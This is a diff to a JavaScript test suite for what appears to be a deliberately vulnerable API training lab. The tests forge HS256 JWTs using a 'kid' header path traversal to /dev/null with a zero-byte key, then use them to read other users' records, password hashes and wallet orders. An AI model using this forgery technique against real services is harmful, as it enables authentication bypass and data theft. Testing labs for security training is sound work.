@@ -49,28 +49,54 @@ describe('JWT key handling labs', function () {
     assert.strictEqual(response.headers['content-type'].startsWith('text/plain'), true);
   });
 
-  it('accepts an HS256 token after kid traverses to /dev/null', async function () {
-    const token = jwt.sign({ sub: 'admin@dvws.local' }, Buffer.from([0]), {
-      algorithm: 'HS256',
-      header: { kid: '../../../../../../dev/null' }
-    });
-    const response = await request.get('/api/v2/jwt-key-lab/kid/profile')
-      .set('Authorization', `Bearer ${token}`);
+  it('uses kid traversal to read actual user records through shared authentication', async function () {
+    const username = `kid_user_${Date.now()}`;
+    const created = await request.post('/api/v2/users').send({ username, password: 'Kid123!' });
+    assert.strictEqual(created.status, 201);
+    assert.strictEqual((await request.get('/api/v2/users')).status, 401);
 
-    assert.strictEqual(response.status, 200);
-    assert.strictEqual(response.body.profile.email, 'admin@dvws.local');
-    assert.strictEqual(response.body.authenticatedAs, 'admin@dvws.local');
-  });
-
-  it('uses kid traversal to forge a token accepted by a protected application endpoint', async function () {
     const token = jwt.sign({ user: 'admin', permissions: ['user:admin'] }, Buffer.from([0]), {
       algorithm: 'HS256',
+      issuer: 'https://github.com/snoopysecurity',
       header: { kid: '../../../../../../dev/null' }
     });
-    const response = await request.get('/api/v2/admin/logs')
+    const response = await request.get('/api/v2/users')
       .set('Authorization', `Bearer ${token}`);
 
     assert.strictEqual(response.status, 200);
-    assert.strictEqual(response.headers['content-type'].startsWith('text/plain'), true);
+    assert.strictEqual((await request.get('/api/v2/jwt-key-lab/kid/profile')
+      .set('Authorization', `Bearer ${token}`)).status, 404);
+    const exposed = response.body.result.find((user) => user.username === username);
+    assert.ok(exposed);
+    assert.match(exposed.password, /^\$2[aby]\$/);
+    const wrongKeyToken = jwt.sign({ user: 'admin' }, Buffer.from([1]), {
+      algorithm: 'HS256', issuer: 'https://github.com/snoopysecurity',
+      header: { kid: '../../../../../../dev/null' }
+    });
+    assert.strictEqual((await request.get('/api/v2/users')
+      .set('Authorization', `Bearer ${wrongKeyToken}`)).status, 401);
+  });
+
+  it('lets a forged identity read its Resource Store wallet and orders', async function () {
+    const username = `kid_wallet_${Date.now()}`;
+    assert.strictEqual((await request.post('/api/v2/users').send({ username, password: 'Kid123!' })).status, 201);
+    const login = await request.post('/api/v2/login').send({ username, password: 'Kid123!' });
+    assert.strictEqual(login.status, 200);
+    const order = await request.post('/api/v2/resource-store/orders')
+      .set('Authorization', `Bearer ${login.body.token}`)
+      .send({ itemId: 'api-monitor', quantity: 1 });
+    assert.strictEqual(order.status, 201);
+
+    const token = jwt.sign({ user: username, permissions: ['user:read'] }, Buffer.from([0]), {
+      algorithm: 'HS256',
+      issuer: 'https://github.com/snoopysecurity',
+      header: { kid: '../../../../../../dev/null' }
+    });
+    const response = await request.get('/api/v2/resource-store')
+      .set('Authorization', `Bearer ${token}`);
+
+    assert.strictEqual(response.status, 200);
+    assert.strictEqual(response.body.balance, 90);
+    assert.strictEqual(response.body.orders[0]._id, order.body.order._id);
   });
 });
